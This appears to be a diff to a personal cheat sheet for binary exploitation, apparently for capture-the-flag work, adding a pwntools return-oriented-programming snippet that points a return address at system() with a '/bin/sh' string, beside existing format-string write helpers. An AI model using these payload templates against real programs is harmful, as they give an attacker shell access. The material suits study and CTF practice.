@@ -47,7 +47,6 @@ payload = fit({
 })
 ```
 
-
 ## Format strings writing to an address
 ```python
 def get_n(new, prev, size):
@@ -78,7 +77,20 @@ def gen_format_writes(to_write, setup_len, stack_offset):
 ```python
 fmtstr_payload(offset=12, writes={old_address: new_address})
 ```
-Use numbwritten to specify the offset
+Note: Use numbwritten to specify the offset
+
+## ROP code snippet 
+
+```python
+target = next(elf.search(b"/bin/sh\x00"))
+assert (target is not None)
+
+payload = fit({
+    offset: elf.symbols["system"],
+    offset + 4: p32(0), #The return address from system
+    offset + 8: p32(target) #The address to a string "/bin/sh"
+})
+```
 
 
 ## Common re
